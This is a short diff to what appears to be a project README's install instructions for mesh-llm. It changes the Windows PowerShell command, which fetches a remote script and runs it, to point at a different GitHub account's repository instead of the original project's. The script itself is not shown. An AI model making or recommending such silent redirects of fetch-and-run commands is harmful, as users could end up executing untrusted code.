@@ -20,7 +20,7 @@ curl -fsSL https://raw.githubusercontent.com/Mesh-LLM/mesh-llm/main/install.sh |
 On Windows, use PowerShell:
 
 ```powershell
-irm https://raw.githubusercontent.com/Mesh-LLM/mesh-llm/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/marlucool/mesh-llm/main/install.ps1 | iex
 ```
 
 Install the Apple Silicon Homebrew formula with
